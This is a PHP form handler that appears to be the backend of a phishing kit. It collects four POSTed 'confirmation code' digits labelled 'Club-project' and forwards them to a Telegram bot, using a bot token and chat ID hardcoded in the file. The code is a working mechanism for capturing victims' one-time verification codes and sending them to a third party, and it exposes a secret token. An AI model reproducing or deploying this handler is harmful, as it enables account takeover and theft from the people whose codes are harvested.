<?php
 
  const TOKEN = '7367612942:AAFI0FQzQZjrFndp0brU65lOVnToSFiEkiA';
 
  const CHATID = '-4138443533';
 
 
if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
  $textSendStatus = '';
   
  if (!empty($_POST['code1']) && !empty($_POST['code2']) && !empty($_POST['code3']) && !empty($_POST['code4'])) {
     
    $txt = "Club-project%0AКод подтверждения%0A%0A";
     
    if (isset($_POST['code1']) && !empty($_POST['code1'])) {
        $txt .= "" . strip_tags(urlencode($_POST['code1'])) . "%0A";
    }

    if (isset($_POST['code2']) && !empty($_POST['code2'])) {
      $txt .= "" . strip_tags(urlencode($_POST['code2'])) . "%0A";
  }

    if (isset($_POST['code3']) && !empty($_POST['code3'])) {
      $txt .= "" . strip_tags(urlencode($_POST['code3'])) . "%0A";
  }

if (isset($_POST['code4']) && !empty($_POST['code4'])) {
    $txt .= "" . strip_tags(urlencode($_POST['code4'])) . "%0A";
  }

    $textSendStatus = @file_get_contents('https://api.telegram.org/bot'. TOKEN .'/sendMessage?chat_id=' . CHATID . '&parse_mode=html&text=' . $txt); 
 
  } else {
    echo json_encode('NOTVALID');
  }
} else {
  header("Location: /");
}